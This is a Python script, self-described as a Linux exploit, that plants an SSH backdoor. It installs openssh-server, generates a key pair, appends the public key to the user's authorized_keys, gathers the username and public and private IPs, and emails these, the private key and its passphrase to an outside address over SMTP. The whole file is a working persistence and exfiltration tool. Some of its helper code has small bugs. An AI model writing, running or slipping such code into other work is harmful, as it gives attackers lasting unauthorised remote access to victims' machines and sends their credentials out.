#!/usr/bin/env python3

# This exploit can work only with linux

from os.path import abspath, dirname, expanduser, isfile, isdir
from os import listdir
import subprocess
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
import random
import string


# SMTP Settings for sending mail
SMTP_SERVER = 'smtp.mailtrap.io'
SMTP_PORT = 2525
DESTINATION_EMAIL = 'destination_email@test.ru'

# Root folder of exploit
ROOT = dirname(abspath(__file__))

SSH_PATH = '~/.ssh'
AUTHORIZED_KEYS_FILE_NAME = 'authorized_keys'

PASSWORD_LEN = 16

AUTH_FILE_NAME = "auth.txt"


def get_auth() -> dict:
    """Get auth data from file"""
    with open(AUTH_FILE_NAME, 'r') as auth_file:
        auth_data = auth_file.read()

    auth_data = auth_data.split('\n')

    return {
        'user': auth_data[0].rstrip().lstrip(),
        'pass': auth_data[1].rstrip().lstrip()
    }


def send_mail(content: str):
    msg = MIMEText(content)

    msg['Subject'] = ' '.join(['Create ssh key', datetime.now().strftime('%Y-%m-%d %H:%M:%S')])
    msg['From'] = 'Exploit'
    msg['To'] = DESTINATION_EMAIL

    s = smtplib.SMTP(SMTP_SERVER, port=SMTP_PORT)

    auth_data = get_auth()

    s.login(auth_data['user'], auth_data['pass'])
    s.sendmail(msg['From'], [msg['To']], msg.as_string())
    s.quit()


def run(command: str or list) -> dict:
    """Start command in console. Return status and output: {status: True|False, content: stdout|stderr} """
    if command is str:
        command = command.split(' ')

    proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if proc.returncode > 0:
        return {'code': False, 'content': proc.stderr.decode()}

    return {'status': True, 'content': proc.stdout.decode()}


def get_public_ip() -> str:
    """Getting ip in internet"""
    return run('curl https://ipinfo.io/ip')['content'].rstrip()


def get_private_ip() -> str:
    """Getting ip in local network"""
    return run('hostname -I')['content'].rstrip()


def get_username() -> str:
    """Return username in system"""
    return run('whoami')['content'].rstrip()


def get_files_in_folder(path: str) -> list:
    """Return list of files in current folder. This function support '~' (Alias of home folder) in path."""
    path = expanduser(path)
    return list(filter(lambda file: isfile('/'.join([path, file])), listdir(path)))


def join_paths(dir_: str, files: list) -> list:
    """Join each file with dir. This function support '~' in path."""
    dir_ = expanduser(dir_)
    return list(map(lambda file: '/'.join([dir_, file]), files))


def generate_ssh_pair(password: str) -> dict:
    """Generate shh key pair"""
    tmp_prefix = datetime.now().strftime('%Y%m%d%H%M%S')
    run(f'ssh-keygen -t rsa -b 4096 -f {tmp_prefix}_tmp -N {password}')

    with open(f'{tmp_prefix}_tmp', 'r') as private_key_file:
        private_key = private_key_file.read()

    with open(f'{tmp_prefix}_tmp.pub', 'r') as pub_key_file:
        public_key = pub_key_file.read()

    run(f'rm {tmp_prefix}_tmp {tmp_prefix}_tmp.pub')

    return {
        'public': public_key,
        'private': private_key
    }


def generate_password(length: int) -> str:
    """Generate random password by len"""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def main():
    run('sudo apt install openssh-server curl')

    authorized_keys_path = expanduser('/'.join([SSH_PATH, AUTHORIZED_KEYS_FILE_NAME]))

    if not isdir(expanduser(SSH_PATH)):
        run(f'mkdir {SSH_PATH}')
    else:
        files = get_files_in_folder(SSH_PATH)

        if AUTHORIZED_KEYS_FILE_NAME not in files:
            run(f'touch {authorized_keys_path}')

    password = generate_password(PASSWORD_LEN)
    key_pair = generate_ssh_pair(password)

    with open(authorized_keys_path, 'a') as keys_file:
        keys_file.write(key_pair['public'])

    username = get_username()
    pub_ip = get_public_ip()
    private_ip = get_private_ip()
    private_key = key_pair['private']

    message = '\n'.join([
        f'Username: {username}',
        f'Public IP: {pub_ip}',
        f'Private IP: {private_ip}',
        f'Password: {password}',
        f'Key:\n{private_key}'
    ])

    send_mail(message)


if __name__ == "__main__":
    main()
